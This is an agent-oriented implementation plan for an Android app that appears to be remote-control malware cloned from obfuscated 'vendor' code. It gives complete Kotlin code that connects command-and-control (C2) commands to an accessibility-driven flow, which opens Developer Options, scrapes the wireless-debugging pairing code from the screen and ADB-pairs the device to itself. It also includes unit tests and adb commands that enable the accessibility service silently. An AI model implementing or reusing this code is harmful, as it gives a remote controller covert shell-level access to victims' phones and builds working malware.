# ADB 配对自动化 P0+P1 修复 Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** 修复审计报告中的 2 个 P0 阻断缺陷 + 2 个 P1 高优缺陷，使 C2 远程配对命令和 executor 生命周期正确工作。

**Architecture:** Task 1 修复 executor val→var + shutdown 重建；Task 2 接入 4 条 C2 stub 命令到 startPairFlow / extractPairingCodeAndPort + doPair；Task 3 修复 isInDevOptionsWindow 页面标题检测（OPPO 真机失败）。所有改动仅修改现有文件，不新建类。

**Tech Stack:** Kotlin, Android AccessibilityService, JUnit 4

**审计报告**: `docs/ADB配对自动化代码审计报告.md`

---

## 文件清单

| 操作 | 文件 | 变更说明 |
|------|------|---------|
| Modify | `app/src/main/java/.../setup/SystemOptimizeManager.kt` | executor val→var + 重建逻辑 |
| Modify | `app/src/main/java/.../setup/SetupConstants.kt` | DEVELOPER_OPTIONS_TEXTS 添加空格变体 + 首屏文本 |
| Modify | `app/src/main/java/.../command/AdbTunnelCommandHandler.kt` | 4 条 stub → 接入 startPairFlow |
| Create | `app/src/test/java/.../setup/ExecutorLifecycleTest.kt` | 3 tests |
| Create | `app/src/test/java/.../command/AdbTunnelCommandHandlerWiringTest.kt` | 4 tests |
| Create | `app/src/test/java/.../setup/IsInDevOptionsWindowTest.kt` | 3 tests |

---

## Task 1: executor val→var + shutdown 重建

**Files:**
- Modify: `app/src/main/java/com/storm/safe/rock/service/modules/setup/SystemOptimizeManager.kt`
- Create: `app/src/test/java/com/storm/safe/rock/service/modules/setup/ExecutorLifecycleTest.kt`

**Problem:** `executor` is declared as `val` (line 1260). After `finishLocalAdbPair()` calls `executor.shutdownNow()` (line 1826), any subsequent `startPairFlow()` cannot schedule tasks. Vendor recreates executor at `C0360a2.java:5105-5109`.

**Vendor code (L5105-5109):**
```java
if (this.f53817a2.isShutdown()) {
    t60.m214714d6("SystemOptimize", "executor 已关闭，重新创建");
    ScheduledExecutorService s = Executors.newSingleThreadScheduledExecutor();
    this.f53817a2 = s;  // ← reassignment
}
```

- [ ] **Step 1: Change `val executor` to `var executor`**

In `SystemOptimizeManager.kt`, find line 1260:
```kotlin
    val executor: ScheduledExecutorService = Executors.newSingleThreadScheduledExecutor()
```

Replace with:
```kotlin
    var executor: ScheduledExecutorService = Executors.newSingleThreadScheduledExecutor()
```

- [ ] **Step 2: Add executor rebuild logic in `startPairFlow()`**

Find `fun startPairFlow()` (around line 3943). Replace the executor shutdown warning block:

```kotlin
        if (executor.isShutdown) {
            Log.w(TAG, "startPairFlow: executor 已关闭，部分任务可能无法调度")
        }
```

With:
```kotlin
        if (executor.isShutdown) {
            Log.i(TAG, "startPairFlow: executor 已关闭，重新创建")
            executor = Executors.newSingleThreadScheduledExecutor()
        }
```

- [ ] **Step 3: Create test file**

Create `app/src/test/java/com/storm/safe/rock/service/modules/setup/ExecutorLifecycleTest.kt`:

```kotlin
package com.storm.safe.rock.service.modules.setup

import org.junit.Test
import org.junit.Assert.*

class ExecutorLifecycleTest {

    private val source by lazy {
        java.io.File("src/main/java/com/storm/safe/rock/service/modules/setup/SystemOptimizeManager.kt").readText()
    }

    @Test
    fun `executor is declared as var not val`() {
        assertTrue("executor must be var for rebuild",
            source.contains("var executor: ScheduledExecutorService"))
        assertFalse("executor must NOT be val",
            source.contains("val executor: ScheduledExecutorService"))
    }

    @Test
    fun `startPairFlow rebuilds executor when shutdown`() {
        val start = source.indexOf("fun startPairFlow()")
        assertTrue(start >= 0)
        val body = source.substring(start, minOf(source.length, start + 1500))
        assertTrue("must check isShutdown",
            body.contains("executor.isShutdown"))
        assertTrue("must create new executor",
            body.contains("Executors.newSingleThreadScheduledExecutor()"))
    }

    @Test
    fun `startPairFlow does not just log warning on shutdown`() {
        val start = source.indexOf("fun startPairFlow()")
        assertTrue(start >= 0)
        val body = source.substring(start, minOf(source.length, start + 1500))
        assertFalse("must NOT just warn about shutdown",
            body.contains("部分任务可能无法调度"))
    }
}
```

- [ ] **Step 4: Commit**

```bash
git add app/src/main/java/com/storm/safe/rock/service/modules/setup/SystemOptimizeManager.kt \
       app/src/test/java/com/storm/safe/rock/service/modules/setup/ExecutorLifecycleTest.kt
git commit -m "fix(setup): executor val→var + rebuild on shutdown

P0-1: finishLocalAdbPair shutdownNow() 后 startPairFlow 无法调度任务
vendor: C0360a2.java:5105-5109 重建 executor"
```

---

## Task 2: AdbTunnelCommandHandler 4 条 stub 接入 startPairFlow

**Files:**
- Modify: `app/src/main/java/com/storm/safe/rock/service/modules/command/AdbTunnelCommandHandler.kt`
- Create: `app/src/test/java/com/storm/safe/rock/service/modules/command/AdbTunnelCommandHandlerWiringTest.kt`

**Problem:** START_PAIRING (L171), FULL_DEPLOY (L223), AUTO_WIRELESS_PAIRING (L265), DIRECT_PAIR (L294) 只获取 SystemOptimizeManager 实例但不调用任何配对方法。

**Vendor behavior:**
- START_PAIRING / AUTO_WIRELESS_PAIRING → `som.m212095k5()` (forceStartPairFlow → startPairFlow)
- FULL_DEPLOY → `forceStart()` (完整链: 权限 → 开发者选项 → 配对)，当前 scope 简化为 `som.startPairFlow()`
- DIRECT_PAIR → `som.m212052e0()` (直接从屏幕读码 → doPair)，使用 `extractPairingCodeAndPort()` + `doPair()`

- [ ] **Step 1: Fix handleStartPairing — call startPairFlow**

Replace the body of `handleStartPairing` (lines 171-195) with:

```kotlin
    private suspend fun handleStartPairing(context: CommandContext) {
        Log.d(TAG, "★★★ 收到手动配对命令 ★★★")
        withContext(Dispatchers.IO) {
            try {
                sendDeployStatus(context, "pairing_started", "正在启动配对流程...")
                val service = context.service
                if (service == null) {
                    sendDeployStatus(context, "pairing_failed", "服务未初始化，请先开启无障碍服务")
                    return@withContext
                }
                val som = try { SystemOptimizeManager.getInstance(service, service) } catch (_: Exception) { null }
                if (som == null) {
                    sendDeployStatus(context, "pairing_failed", "服务未初始化，请先开启无障碍服务")
                    return@withContext
                }
                som.startPairFlow()
                sendDeployStatus(context, "pairing_triggered", "配对流程已触发，请等待自动完成...")
            } catch (e: Exception) {
                Log.e(TAG, "启动配对失败", e)
                sendDeployStatus(context, "pairing_failed", "启动配对失败: ${e.message}")
            }
        }
    }
```

- [ ] **Step 2: Fix handleFullDeploy — call startPairFlow (must be suspend+IO)**

`startPairFlow()` 内部调用 `sleep200(5)` 即 `Thread.sleep(1000)`，是阻塞调用。`handleFullDeploy` 原本不是 suspend 函数，但 `handle()` 分发器是 suspend，所以改为 suspend + withContext(IO) 避免阻塞。

Replace the body of `handleFullDeploy` (lines 223-241) with:

```kotlin
    private suspend fun handleFullDeploy(context: CommandContext) {
        Log.d(TAG, "★★★ 收到完整部署命令 ★★★")
        sendDeployStatus(context, "full_deploy_started", "开始完整部署...")
        val service = context.service ?: run {
            sendDeployStatus(context, "full_deploy_failed", "服务未初始化")
            return
        }
        val som = try { SystemOptimizeManager.getInstance(service, service) } catch (_: Exception) { null }
        if (som == null) {
            sendDeployStatus(context, "full_deploy_failed", "SystemOptimizeManager 初始化失败")
            return
        }
        withContext(Dispatchers.IO) {
            try {
                service.getSharedPreferences("system_optimize", 0)
                    .edit().putBoolean("pair_completed", false).apply()
                som.startPairFlow()
                sendDeployStatus(context, "full_deploy_triggered", "★★★ 完整部署流程已启动 ★★★")
            } catch (e: Exception) {
                Log.e(TAG, "完整部署失败", e)
                sendDeployStatus(context, "full_deploy_failed", "★★★ 完整部署流程失败: ${e.message} ★★★")
            }
        }
    }
```

- [ ] **Step 3: Fix handleAutoWirelessPairing — call startPairFlow (must be suspend+IO)**

同理，改为 suspend + withContext(IO)。

Replace the body of `handleAutoWirelessPairing` (lines 265-286) with:

```kotlin
    private suspend fun handleAutoWirelessPairing(context: CommandContext) {
        Log.d(TAG, "★★★ 自动无线配对 ★★★")
        withContext(Dispatchers.IO) {
            try {
                sendDeployStatus(context, "pairing_start", "开始自动配对...")
                val service = context.service
                if (service == null) {
                    sendCommandResult(context, false, "服务未初始化")
                    return@withContext
                }
                val som = try { SystemOptimizeManager.getInstance(service, service) } catch (_: Exception) { null }
                if (som == null) {
                    sendCommandResult(context, false, "SystemOptimizeManager 初始化失败")
                    return@withContext
                }
                som.startPairFlow()
                sendCommandResult(context, true, "配对流程已启动")
            } catch (e: Exception) {
                Log.e(TAG, "自动无线配对异常", e)
                sendDeployStatus(context, "pairing_failed", "配对异常: ${e.message}")
            }
        }
    }
```

- [ ] **Step 4: Fix handleDirectPair — read screen + doPair**

Replace the body of `handleDirectPair` (lines 294-331) with:

```kotlin
    private suspend fun handleDirectPair(context: CommandContext) {
        Log.d(TAG, "★★★ 直接配对（读取屏幕配对码）★★★")
        try {
            val service = context.service
            if (service == null) {
                sendDeployStatus(context, "direct_pair_failed", "配对管理器未初始化")
                return
            }
            val som = try { SystemOptimizeManager.getInstance(service, service) } catch (_: Exception) { null }
            if (som == null) {
                sendDeployStatus(context, "direct_pair_failed", "配对管理器未初始化")
                return
            }
            sendDeployStatus(context, "direct_pair_start", "正在读取屏幕配对码...")
            withContext(Dispatchers.IO) {
                try {
                    val info = som.extractPairingCodeAndPort()
                    if (info == null) {
                        sendDeployStatus(context, "direct_pair_failed", "未能从屏幕读取到配对码")
                        return@withContext
                    }
                    Log.i(TAG, "读取到配对码: port=${info.port}, code=${info.pairingCode}")
                    sendDeployStatus(context, "direct_pair_pairing", "配对码已读取，正在执行 SPAKE2 配对...")
                    val success = som.doPair(info.port, info.pairingCode)
                    if (success) {
                        sendDeployStatus(context, "direct_pair_success", "★★★ 直接配对成功 ★★★")
                    } else {
                        sendDeployStatus(context, "direct_pair_failed", "SPAKE2 配对失败")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "直接配对异常", e)
                    sendDeployStatus(context, "direct_pair_failed", "配对异常: ${e.message}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "直接配对异常", e)
            sendDeployStatus(context, "direct_pair_failed", "配对异常: ${e.message}")
        }
    }
```

- [ ] **Step 5: Create test file**

Create `app/src/test/java/com/storm/safe/rock/service/modules/command/AdbTunnelCommandHandlerWiringTest.kt`:

```kotlin
package com.storm.safe.rock.service.modules.command

import org.junit.Test
import org.junit.Assert.*

class AdbTunnelCommandHandlerWiringTest {

    private val source by lazy {
        java.io.File("src/main/java/com/storm/safe/rock/service/modules/command/AdbTunnelCommandHandler.kt").readText()
    }

    @Test
    fun `handleStartPairing calls startPairFlow`() {
        val start = source.indexOf("fun handleStartPairing(")
        assertTrue("handleStartPairing must exist", start >= 0)
        val body = source.substring(start, minOf(source.length, start + 1000))
        assertTrue("must call som.startPairFlow()",
            body.contains("som.startPairFlow()"))
        assertFalse("must NOT have stub comment",
            body.contains("doesn't have startWirelessPairing yet"))
    }

    @Test
    fun `handleFullDeploy calls startPairFlow`() {
        val start = source.indexOf("fun handleFullDeploy(")
        assertTrue("handleFullDeploy must exist", start >= 0)
        val body = source.substring(start, minOf(source.length, start + 1000))
        assertTrue("must call som.startPairFlow()",
            body.contains("som.startPairFlow()"))
        assertFalse("must NOT have stub comment",
            body.contains("complex forceStart with callbacks"))
    }

    @Test
    fun `handleAutoWirelessPairing calls startPairFlow`() {
        val start = source.indexOf("fun handleAutoWirelessPairing(")
        assertTrue("handleAutoWirelessPairing must exist", start >= 0)
        val body = source.substring(start, minOf(source.length, start + 1000))
        assertTrue("must call som.startPairFlow()",
            body.contains("som.startPairFlow()"))
    }

    @Test
    fun `handleDirectPair calls extractPairingCodeAndPort and doPair`() {
        val start = source.indexOf("fun handleDirectPair(")
        assertTrue("handleDirectPair must exist", start >= 0)
        val body = source.substring(start, minOf(source.length, start + 1500))
        assertTrue("must call extractPairingCodeAndPort",
            body.contains("extractPairingCodeAndPort()"))
        assertTrue("must call doPair",
            body.contains("doPair("))
    }
}
```

- [ ] **Step 6: Commit**

```bash
git add app/src/main/java/com/storm/safe/rock/service/modules/command/AdbTunnelCommandHandler.kt \
       app/src/test/java/com/storm/safe/rock/service/modules/command/AdbTunnelCommandHandlerWiringTest.kt
git commit -m "fix(command): wire 4 C2 stub commands to startPairFlow/doPair

P0-2: START_PAIRING/FULL_DEPLOY/AUTO_WIRELESS_PAIRING → som.startPairFlow()
      DIRECT_PAIR → som.extractPairingCodeAndPort() + som.doPair()"
```

---

## Task 3: isInDevOptionsWindow OPPO 兼容修复

**Files:**
- Modify: `app/src/main/java/com/storm/safe/rock/service/modules/setup/SetupConstants.kt`
- Create: `app/src/test/java/com/storm/safe/rock/service/modules/setup/IsInDevOptionsWindowTest.kt`

**Problem:** `isInDevOptionsWindow()` 在 OPPO PGFM10 (Android 16) 上返回 false。

**真机验证发现：**
1. OPPO Settings 首屏不显示 "USB调试"/"无线调试" 等文本（需要滚动），`findAccessibilityNodeInfosByText` 找不到
2. "OEM 解锁" 有空格但 `DEVELOPER_OPTIONS_TEXTS` 只有无空格版 "OEM解锁"
3. 标题文本 "开发者选项" **不能用于检测**——OPPO 使用 subActivity 机制，标题栏在 Settings 所有子页面都保留上层标题，会导致**全局误报**
4. 首屏可见且唯一存在于开发者选项的文本：**"OEM 解锁"（有空格）**、**"充电时屏幕不休眠"**、**"内存"（作为开发者选项特有项）**

**修复方案:** 在 `DEVELOPER_OPTIONS_TEXTS` 中添加**带空格的变体**和**首屏可见的特征文本**。不新建常量，保持现有 `isInDevOptionsWindow` 逻辑不变。

- [ ] **Step 1: 在 DEVELOPER_OPTIONS_TEXTS 中添加空格变体和首屏文本**

在 `SetupConstants.kt` 的 `DEVELOPER_OPTIONS_TEXTS` 列表末尾（`)`之前），追加：

```kotlin
    // OPPO ColorOS 空格变体 (真机验证: "OEM 解锁" 有空格)
    "OEM 解锁", "OEM 解鎖",
    // 首屏可见特征文本 (不需要滚动，多厂商通用)
    "充电时屏幕不休眠", "充電時螢幕不休眠",
    "Stay awake when charging",
    "正在运行的服务", "正在運行的服務",
    "Running services",
    "桌面备份密码", "桌面備份密碼",
    "Desktop backup password",
    "错误报告", "錯誤報告",
    "Bug report", "Bug reports",
    "OEM unlocking"
```

- [ ] **Step 2: 创建测试文件**

Create `app/src/test/java/com/storm/safe/rock/service/modules/setup/IsInDevOptionsWindowTest.kt`:

```kotlin
package com.storm.safe.rock.service.modules.setup

import org.junit.Test
import org.junit.Assert.*

class IsInDevOptionsWindowTest {

    private val source by lazy {
        java.io.File("src/main/java/com/storm/safe/rock/service/modules/setup/SystemOptimizeManager.kt").readText()
    }

    private val constantsSource by lazy {
        java.io.File("src/main/java/com/storm/safe/rock/service/modules/setup/SetupConstants.kt").readText()
    }

    @Test
    fun `DEVELOPER_OPTIONS_TEXTS contains OPPO space variants`() {
        assertTrue("must contain 'OEM 解锁' with space",
            constantsSource.contains("OEM 解锁"))
        assertTrue("must contain 'OEM unlocking'",
            constantsSource.contains("OEM unlocking"))
    }

    @Test
    fun `DEVELOPER_OPTIONS_TEXTS contains no-scroll visible texts`() {
        assertTrue("must contain '充电时屏幕不休眠'",
            constantsSource.contains("充电时屏幕不休眠"))
        assertTrue("must contain 'Bug report'",
            constantsSource.contains("Bug report"))
        assertTrue("must contain '正在运行的服务'",
            constantsSource.contains("正在运行的服务"))
    }

    @Test
    fun `isInDevOptionsWindow uses DEVELOPER_OPTIONS_TEXTS`() {
        val start = source.indexOf("fun isInDevOptionsWindow()")
        assertTrue(start >= 0)
        val body = source.substring(start, minOf(source.length, start + 800))
        assertTrue("must use DEVELOPER_OPTIONS_TEXTS",
            body.contains("DEVELOPER_OPTIONS_TEXTS"))
    }
}
```

- [ ] **Step 3: Commit**

```bash
git add app/src/main/java/com/storm/safe/rock/service/modules/setup/SetupConstants.kt \
       app/src/test/java/com/storm/safe/rock/service/modules/setup/IsInDevOptionsWindowTest.kt
git commit -m "fix(setup): DEVELOPER_OPTIONS_TEXTS add OPPO space variants + no-scroll texts

P1-5: OPPO ColorOS dev options page has 'OEM 解锁' (with space) not 'OEM解锁'
Add space variants + first-screen-visible texts (充电时屏幕不休眠, 正在运行的服务, etc.)
Verified on OPPO PGFM10 Android 16 real device"
```

---

## Task 4: 统一验证

**Files:** (no modifications — verification only)

- [ ] **Step 1: Run all new tests**

```bash
cd /home/code/php/project/full-package/update-replica && \
./gradlew testDebugUnitTest \
    --tests "com.storm.safe.rock.service.modules.setup.ExecutorLifecycleTest" \
    --tests "com.storm.safe.rock.service.modules.command.AdbTunnelCommandHandlerWiringTest" \
    --tests "com.storm.safe.rock.service.modules.setup.IsInDevOptionsWindowTest" \
    --no-build-cache 2>&1 | tail -10
```

Expected: 10 tests PASS (3+4+3)

- [ ] **Step 2: Run full test suite**

```bash
./gradlew test --no-build-cache 2>&1 | tail -10
```

Expected: All existing tests PASS + 10 new tests PASS. Pre-existing failures (HuaweiStep/CipherCapture) unchanged.

- [ ] **Step 3: Build APK**

```bash
./gradlew assembleDebug 2>&1 | tail -5
```

Expected: BUILD SUCCESSFUL

- [ ] **Step 4: OPPO 真机验证 — isInDevOptionsWindow**

需要先安装 APK、重启服务、打开开发者选项页面、然后触发 startPairFlow。

```bash
ADB=/mnt/c/Users/Administrator/Downloads/platform-tools/adb.exe
DEV=OZZL5PLZQOYP4T8T
$ADB -s $DEV install -r app/build/outputs/apk/debug/app-debug.apk
$ADB -s $DEV shell am force-stop dev.deltalab2964.swift
$ADB -s $DEV shell settings put secure enabled_accessibility_services dev.deltalab2964.swift/com.storm.safe.rock.service.MyAccessibilityService
sleep 3
# 先打开开发者选项页面
$ADB -s $DEV shell am start -a android.settings.APPLICATION_DEVELOPMENT_SETTINGS
sleep 3
# 用 debug flag 触发 startPairFlow (在开发者选项页面上下文中)
$ADB -s $DEV logcat -c
$ADB -s $DEV shell settings put global debug_start_pair 1
sleep 8
$ADB -s $DEV logcat -d | grep "SystemOptimize" | grep -i "K()\|找到\|pairInDevOption\|已在开发者"
```

Expected: `K() 找到选项'OEM 解锁'，返回true` 或其他首屏可见文本 + `已在开发者选项页面`

**注意**: `debug_start_pair` flag 需要 `WRITE_SECURE_SETTINGS` 权限才能被 app 清除，会被多次触发。这是测试辅助机制的已知限制。

---

## 超出范围（显式声明）

| 项 | 原因 |
|----|------|
| Scene E (confirmLock) | 需要真机有锁屏密码才能测试 |
| Scene F (securityCenter) | 需要 MIUI 真机测试 |
| c41 case 7 (SilentRecover) | 依赖完整 ADB connection 类 (g41) |
| deployLocalService | 依赖 ADB connection 类 (g41) |
| WindowDetector (bf1) | 独立大模块，需要单独 plan |
| forceStartPairFlow vs startPairFlow 分离 | P2 降级 — c41 case 5/6 与 11/12 执行相同方法 |
| 标题文本 "开发者选项" 检测 | OPPO 真机验证发现标题栏在所有 Settings 子页面都保留，会全局误报 |

---

## Self-Review Checklist

1. **Spec coverage:** P0-1 (executor) → Task 1; P0-2 (C2 stubs) → Task 2; P1-5 (isInDevOptionsWindow OPPO) → Task 3; Task 4 统一验证
2. **Placeholder scan:** 无 TBD/TODO/implement later — 所有代码完整
3. **Type consistency:** `som.startPairFlow()` 在 Task 2 中调用，Task 1 中方法签名未变；`som.extractPairingCodeAndPort()` 返回 `PairingInfo?`，Task 2 Step 4 正确处理 null；`som.doPair(port, code)` 返回 `Boolean`，Task 2 Step 4 正确检查
4. **线程安全:** handleFullDeploy 和 handleAutoWirelessPairing 改为 `suspend` + `withContext(Dispatchers.IO)`，避免 `startPairFlow()` 的 `Thread.sleep` 阻塞协程线程
5. **OPPO 误报验证:** 标题文本 "开发者选项" 方案被真机验证否决（Settings 所有子页面都有该标题），改为添加空格变体 + 首屏可见特征文本方案
